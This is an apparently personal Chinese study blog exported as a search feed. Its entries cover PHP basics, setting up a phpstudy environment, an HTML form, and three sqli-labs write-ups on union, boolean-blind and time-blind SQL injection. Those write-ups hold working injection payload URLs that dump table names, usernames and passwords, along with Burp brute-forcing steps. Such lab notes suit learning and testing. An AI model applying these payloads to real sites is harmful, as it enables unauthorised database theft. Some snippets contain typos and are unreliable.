<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">4</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> $GLOBALS[<span class="string">'x'</span>];</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2020032723031049.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>static</strong><br>在PHP中，通常一个函数被调用完之后，他的变量会被删除，而如果你不想他被删除的话，可以在开始处用<strong>static</strong>来修饰一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $x;</span><br><span class="line">  fuction test()&#123;</span><br><span class="line">  <span class="keyword">static</span> $y=<span class="number">4</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"y的值是:$y"</span>;</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样在这个函数被调用之后，y的值仍能一直保持为4，不过注意，y用static修饰过之后仍然是局部变量。<br><strong>参数的作用域</strong><br>参数是通过调用代码将值传递给函数的局部变量。参数是在参数列表中声明的，作为函数声明的一部分。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fuction test()&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"x的值是:$x"</span>;</span><br><span class="line">&#125;</span><br><span class="line">test(<span class="number">6</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这样子输出的结果就是<br><img src="https://img-blog.csdnimg.cn/20200327214030169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这次的学习就到这里了，下次学到东西了再记录，总的感觉还是学到了很多的 加油吧！</p>
]]></content>
  </entry>
  <entry>
    <title>利用phpstudy集成环境＋sublime创建PHP编译环境</title>
    <url>/2020/03/27/%E5%88%A9%E7%94%A8phpstudy%E9%9B%86%E6%88%90%E7%8E%AF%E5%A2%83%EF%BC%8Bsublime%E5%88%9B%E5%BB%BAPHP%E7%BC%96%E8%AF%91%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>前言：最近开始学习PHP语言了，而学习这种语言需要apache、编译器、php环境这三个条件。一个phpstudy集成环境就很好的解决了这个问题。俗话说工欲善其事必先利其器，而我的电脑上刚好还有PHP study和sublime这两个强大的工具，何不利用一下？</p>
<h2 id="PHP语言"><a href="#PHP语言" class="headerlink" title="PHP语言"></a>PHP语言</h2><p>先说个无关的，从我的理解方面来介绍一下PHP语言。<br><strong>PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言。</strong><br><strong>PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言。</strong><br><strong>PHP 脚本在服务器上执行。<br>   PHP 可免费下载使用。</strong><br><strong>PHP语言可以用来制作一些动态网页</strong><br>所谓动态网页，就是说网页的内容可以随着时间，环境或者数据库的操作来进行变化。</p>
<h2 id="PHP-study的设置"><a href="#PHP-study的设置" class="headerlink" title="PHP study的设置"></a>PHP study的设置</h2><p><img src="https://img-blog.csdnimg.cn/20200327091855186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>打开软件，更改一下版本，我选择的是图中的版本，其他版本的应该也可以的。<br><strong>添加环境变量</strong><br>在phpstudy文件夹里找到你的这个版本的文件夹，然后在计算机环境变量里面添加，要注意变量是添加到下面的path变量里。<br><img src="https://img-blog.csdnimg.cn/20200327092308511.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200327092407736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>将你刚才复制的路径添加进去，然后就是确定，确定，确定。<br>设置完成，如果不放心，可以验证一下。打开DOS命令窗口，输入php -v。<br>出现的版本号是你之前选的那个就可以了。<br><strong>Sublime的使用</strong><br>首先打开sublime。按图所示进行创建。<br><img src="https://img-blog.csdnimg.cn/20200327092936675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>创建完成后，文件里会出现一些东西，然后全部删除，输入下面的代码（从某位大佬里复制过来的）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;   </span><br><span class="line">    <span class="string">"cmd"</span>: [<span class="string">"php"</span>, <span class="string">"$file"</span>],  </span><br><span class="line">    <span class="string">"file_regex"</span>: <span class="string">"php$"</span>,   </span><br><span class="line">    <span class="string">"selector"</span>: <span class="string">"source.php"</span>   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完成之后保存，文件名为php.sublime-build<br>之后重启软件，选择PHP。如图<br><img src="https://img-blog.csdnimg.cn/20200327100901583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>接着就可以进行编写了。在软件右下角有一个Plain Text，点击更换为php就行了。<br>然后输入你的php代码，ctrl+B测试一下就可以了。<br><img src="https://img-blog.csdnimg.cn/20200327101125398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样就可以了。</p>
]]></content>
  </entry>
  <entry>
    <title>时间盲注的学习</title>
    <url>/2020/03/25/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="时间盲注的条件"><a href="#时间盲注的条件" class="headerlink" title="时间盲注的条件"></a>时间盲注的条件</h2><p>之前已经学习过了<strong>布尔盲注</strong>，其实<strong>时间盲注</strong>和<strong>布尔盲注</strong>基本上一样，只不过布尔盲注<strong>有回显</strong>，而时间盲注<strong>没有</strong>，其实时间盲注可以解决多种方法的盲注问题。</p>
<h2 id="学习时间盲注需要用到的函数"><a href="#学习时间盲注需要用到的函数" class="headerlink" title="学习时间盲注需要用到的函数"></a>学习时间盲注需要用到的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sleep()/延迟函数</span><br><span class="line"><span class="keyword">if</span>(condition,<span class="keyword">true</span>,<span class="keyword">false</span>)<span class="comment">//若条件为真 执行true，若条件为假 执行false</span></span><br><span class="line">substring(<span class="string">"string"</span>,strart,length)</span><br></pre></td></tr></table></figure>
<h2 id="时间盲注的实例"><a href="#时间盲注的实例" class="headerlink" title="时间盲注的实例"></a>时间盲注的实例</h2><p><strong>在这里就用sqli-labs的第10关讲一下</strong><br><strong>首先判断注入点</strong><br>输入代码<br><code>http://localhost/sqli-labs-master/Less-10/?id=1&quot; and sleep(10) --+</code><br>发现会延迟10秒出现结果，说明注入点时”。<br><strong>判断数据库长度</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if(length(database())&gt;5,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
<p><strong>接着爆出数据库名</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
<p>接着就更改1的值来爆出来名字。<br><strong>爆表名</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
<p>和上面的一样，更改limit 0，1的值来爆出来名字。<br><strong>和布尔盲注相比就是多了一个if的函数，其他的基本一样。</strong><br><strong>爆字段</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and if((ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
<p><strong>爆值</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-10/?id=1" and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+</span></span><br></pre></td></tr></table></figure>
<p>到这里就爆出来了，可以用脚本来进行爆破，由于技术原因就不展示了。<br>奈何本人技术差，一纯手工注入走天下，将来进行脚本学习再补回来。</p>
]]></content>
  </entry>
  <entry>
    <title>布尔盲注初体验</title>
    <url>/2020/03/07/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！"><a href="#上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！" class="headerlink" title="上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！"></a>上次进行了联合查询注入学习，这次进入了布尔盲注的学习，继续加油吧！</h2><h2 id="了解布尔盲注"><a href="#了解布尔盲注" class="headerlink" title="了解布尔盲注"></a>了解布尔盲注</h2><p><strong>布尔盲注的条件</strong><br>布尔盲注在注入时不会显示具体的信息，即没有显示位，只会返回对或者错误。<br><strong>布尔盲注需要用到的几个函数</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">length</span>()函数可返回字符串的长度</span><br><span class="line"><span class="selector-tag">substring</span>()函数可以截取字符串，可指定开始的位置和截取的长度</span><br><span class="line"><span class="selector-tag">ord</span>()函数可以返回单个字符的<span class="selector-tag">ASCII</span>码</span><br><span class="line"><span class="selector-tag">char</span>()函数可将<span class="selector-tag">ASCII</span>码转换为对应的字符</span><br></pre></td></tr></table></figure>
<p>在上面ord()也可以用ascii()来代替，效果一样。</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><strong>1、判断注入点</strong><br><img src="https://img-blog.csdnimg.cn/20200307194458832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入” or 1=1#时显示正确，删除”时出现错误，说明闭合符号是 “ 。<br><strong>判断数据库长度</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or length(database7())&gt;1 #</span></span><br></pre></td></tr></table></figure>
<p>显示正确<br><img src="https://img-blog.csdnimg.cn/20200307195132807.png" alt="在这里插入图片描述">接着就依次判断，发现最后长度为10.<br><strong>爆数据库长度</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or ascii(substr((database()),1,1))&gt;65#</span></span><br><span class="line"><span class="string">?id=1"</span> <span class="keyword">or</span> ord(substr((database()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">65</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>上面两种都可以用。用纯手工的注入的话，需要一个一个判断，很麻烦，所以可以利用brup进行爆破，再往上就是利用脚本了。本人技术很菜，所以就说一下怎样用brup进行爆破吧。<br><strong>利用brup进行爆破</strong><br><img src="https://img-blog.csdnimg.cn/20200307200514302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先进行抓包，然后将包发送到intruder中<br><img src="https://img-blog.csdnimg.cn/20200307200639616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后设置变量，由于变量是两个，所以需要用第四个进行爆破。<br><img src="https://img-blog.csdnimg.cn/2020030720100865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>两个都设置为Numbers型的，然后第一个从1开始，到10，依次增加1，第二个从0开始 依次增加1，到127结束。设置完成后就可以进行爆破了。<br><img src="https://img-blog.csdnimg.cn/20200307201640539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后只需要观察选出正确值就行了。<br>接下来就是爆出表名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;65#</span></span><br></pre></td></tr></table></figure>
<p>接着进行上面的爆破步骤就可以爆出来了。<br>通过修改 limit 0,1的值就可以爆出来不同的数据表名了。其中，limit 0，1指的是从第一列开始取一个值。<br><strong>爆字段和值</strong><br>爆字段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or (ascii(substr((select column_name from information_schema.columns where table_name='user_1' limit 0,1),1,1)))&gt;1#</span></span><br></pre></td></tr></table></figure>
<p>爆值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">" or (ascii(substr((select password from user_1 limit 0,1),1,1)))&gt;1#</span></span><br></pre></td></tr></table></figure>
<h2 id="接着把brup爆破出来的数值转换一下就可以得到了。"><a href="#接着把brup爆破出来的数值转换一下就可以得到了。" class="headerlink" title="接着把brup爆破出来的数值转换一下就可以得到了。"></a>接着把brup爆破出来的数值转换一下就可以得到了。</h2>]]></content>
  </entry>
  <entry>
    <title>sqli-labs学习sql注入</title>
    <url>/2020/02/29/sqli-labs%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="sqli-labs的安装和配置"><a href="#sqli-labs的安装和配置" class="headerlink" title="sqli-labs的安装和配置"></a>sqli-labs的安装和配置</h2><h2 id="在大佬的指导下进行了对sql注入的初步了解，特写博客来记录一下第一次时遇到的问题。"><a href="#在大佬的指导下进行了对sql注入的初步了解，特写博客来记录一下第一次时遇到的问题。" class="headerlink" title="在大佬的指导下进行了对sql注入的初步了解，特写博客来记录一下第一次时遇到的问题。"></a>在大佬的指导下进行了对sql注入的初步了解，特写博客来记录一下第一次时遇到的问题。</h2><p>下载sqli-labs和phpstudy(注意PHP study版本不能高于8.0，不然容易出错，本人就是PHP study版本高了，一直出错)<br>下载完成后将sqli-labs解压放在PHP study的WWW文件夹下<br><img src="https://img-blog.csdnimg.cn/20200225152738529.png" alt="在这里插入图片描述"><br>打开sqli-labs-master\sql-connections，在里面有一个db-creds.inc文档，打开编辑<br><img src="https://img-blog.csdnimg.cn/20200225153013271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9iG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一般默认用户名、密码都是root，更改过的话输入自己更改后的就行。接下来浏览器输入<a href="http://localhost/sqli-labs-master打开" target="_blank" rel="noopener">http://localhost/sqli-labs-master打开</a><br><img src="https://img-blog.csdnimg.cn/20200225153308153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Setup/reset Database for labs<br><img src="https://img-blog.csdnimg.cn/20200225153517725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>出现这个就代表成功了。</p>
<h2 id="联合查询注入法"><a href="#联合查询注入法" class="headerlink" title="联合查询注入法"></a>联合查询注入法</h2><p><strong>在sql注入时应该记住的一些东西<br>information_schema库存放了所有库的信息<br>information_schema.columns包含了所有表的字段<br>table_name表名<br>table_schema数据库名<br>column_name列名<br>information_schema.tables包含所有库的表名<br>group_concat()函数能将相同的行组合起来，省老事了。</strong></p>
<p><strong>联合查询注入的原理</strong><br>联合查询注入的前提就是要有显示位(通过查询从数据库返回到页面的内容)。<br>因本人为萌新一枚，在这里就以sqli-labs（一）为例子进行说明。<br>打开网站，进入Lesson 1<br><img src="https://img-blog.csdnimg.cn/20200228192549167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>1、判断注入点</strong><br>闭合符号一般是’、”或者没有闭合符号，而注释符号一般是”) 和 –+<br>在搜索框内输入?id=1’，发现提示错误。<br><img src="https://img-blog.csdnimg.cn/20200228193234290.png" alt="在这里插入图片描述"><br>用注释符号–+注释后发现正常</p>
<p><img src="https://img-blog.csdnimg.cn/20200228193407902.png" alt="在这里插入图片描述"><br>说明注入点是单引号’<br><strong>2、判断列数</strong><br>在输入框内输入id=1,,2,3;时，均有不同的数据返回。然后输入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//http://localhost/sqli-labs-master/Less-1/?id=1' order by 4 --+</span></span><br></pre></td></tr></table></figure>
<p>发现<br><img src="https://img-blog.csdnimg.cn/20200228193828695.png" alt="在这里插入图片描述"><br>说明一共有三列<br><strong>3、联合查询开始</strong><br>输入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
<p>在这里的意思是将id的值等于一个在数据库中不存在的数，通过联合查询可以看出输入的数据会在哪里显示出来。<br><img src="https://img-blog.csdnimg.cn/20200228194255782.png" alt="在这里插入图片描述"><br>结果显示出了2 3的位置，所以在2 3位置我们便可以输入我们想用的句子。<br><strong>爆数据库</strong><br>爆数据库时可以通过一个<strong>database()</strong>语句来查看当前的数据库</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-1/?id=0' union select 1,database(),3 --+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200228194743939.png" alt="在这里插入图片描述"><br><strong>爆数据表</strong><br>在上面说的一些语句，这里就要用到了<br>既然是爆数据表，首先就需要一个group_concat()函数加一个数据表名table_name,然后还需要指定一个来源，而来源就是所有库的表名从上面爆出来的数据库中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200229193148686.png" alt="在这里插入图片描述"><br><strong>爆字段</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.column where table_schema='users'),3 --+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200229194221881.png" alt="在这里插入图片描述"><br><strong>爆值</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200229194455846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样，值就被爆出来了！</p>
<hr>
]]></content>
  </entry>
  <entry>
    <title>HTML表单</title>
    <url>/2020/02/28/HTML%E8%A1%A8%E5%8D%95/</url>
    <content><![CDATA[<h1 id="用HTML制作一个简单的表单并用css进行美化"><a href="#用HTML制作一个简单的表单并用css进行美化" class="headerlink" title="用HTML制作一个简单的表单并用css进行美化"></a>用HTML制作一个简单的表单并用css进行美化</h1><h2 id="表单制作"><a href="#表单制作" class="headerlink" title="表单制作"></a>表单制作</h2><h2 id="制作的表单利用了文本域、下拉框、密码、单选框、复选框、按钮以及提交按钮等。"><a href="#制作的表单利用了文本域、下拉框、密码、单选框、复选框、按钮以及提交按钮等。" class="headerlink" title="制作的表单利用了文本域、下拉框、密码、单选框、复选框、按钮以及提交按钮等。"></a>制作的表单利用了文本域、下拉框、密码、单选框、复选框、按钮以及提交按钮等。</h2><p>二话不说，先上代码:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">html</span>&gt;</span><br><span class="line">&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">&lt;form action="" method="GET"&gt;</span><br><span class="line">    用户名:</span><br><span class="line">    &lt;input type="text" name="用户名"&gt;</span><br><span class="line">    &lt;<span class="selector-tag">br</span>&gt;</span><br><span class="line">    密码:</span><br><span class="line">    &lt;input type="password" name="密码"&gt;</span><br><span class="line">    &lt;<span class="selector-tag">br</span>&gt;</span><br><span class="line">    性别:</span><br><span class="line">    &lt;input type="radio" name="sex" value="male"&gt;男</span><br><span class="line">    &lt;input type="radio" name="sex" value="female"&gt;女</span><br><span class="line">    &lt;<span class="selector-tag">br</span>&gt;</span><br><span class="line">    爱好:</span><br><span class="line">    &lt;input type="checkbox" name="aihao" value="dalanqiu"&gt;篮球</span><br><span class="line">    &lt;input type="checkbox" name="aihao" value="tizuqiu"&gt;足球</span><br><span class="line">    &lt;input type="checkbox" name="aihao" value="pingpangqiu"&gt;乒乓球</span><br><span class="line">    &lt;input type="checkbox" name="aihao" value="shu"&gt;看书</span><br><span class="line">    &lt;input type="checkbox" name="aihao" value="jioa"&gt;睡觉</span><br><span class="line">    &lt;<span class="selector-tag">br</span>&gt;</span><br><span class="line">    城市:</span><br><span class="line">    &lt;select name="city"&gt;</span><br><span class="line">        &lt;option value="yu"&gt;河南&lt;/option&gt;</span><br><span class="line">        &lt;option value="bj"&gt;北京&lt;/option&gt;</span><br><span class="line">        &lt;option value="sh"&gt;上海&lt;/option&gt;</span><br><span class="line">        &lt;option value="tj"&gt;天津&lt;/option&gt;</span><br><span class="line">        &lt;option value="sz"&gt;深圳&lt;/option&gt;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">    &lt;<span class="selector-tag">br</span>&gt;</span><br><span class="line">    &lt;input type="button" value="您无事可以点着解闷儿"&gt;</span><br><span class="line">    &lt;<span class="selector-tag">br</span>&gt;</span><br><span class="line">    &lt;input type="submit"&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;textarea rows="50" cols="50"&gt;在此可以写您想写的话：&lt;/textarea&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>效果图如下：<br><img src="https://img-blog.csdnimg.cn/20200118140322762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="用css进行美化"><a href="#用css进行美化" class="headerlink" title="用css进行美化"></a>用css进行美化</h2><p>css可以进行多种的美化方式，其中有文本样式、背景样式、背景图片等多种。<br>在这里只对制作网页进行了简单的美化，只美化了背景部分以及部分字体颜色，效果如下：<br><img src="https://img-blog.csdnimg.cn/20200118141442777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而做到这个只需要增加一个网页格式style代码段即可，具体增加代码如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line">    <span class="selector-tag">body</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attribute">background</span>:white <span class="built_in">url</span>(james.png) repeat-y right top;</span><br><span class="line">        <span class="attribute">margin-right</span>:<span class="number">1000px</span>;</span><br><span class="line">        boxes&lt;font-size:14px; color:red;&gt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.boxes</span>&#123;<span class="attribute">font-size</span>:<span class="number">14px</span>; <span class="attribute">color</span>:yellow;&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h2 id="由于制作的是表单，感觉还是以简单，纯净为主，所以没有对字体以及背景颜色进行改变。"><a href="#由于制作的是表单，感觉还是以简单，纯净为主，所以没有对字体以及背景颜色进行改变。" class="headerlink" title="由于制作的是表单，感觉还是以简单，纯净为主，所以没有对字体以及背景颜色进行改变。"></a><strong>由于制作的是表单，感觉还是以简单，纯净为主，所以没有对字体以及背景颜色进行改变。</strong></h2>]]></content>
  </entry>
</search>
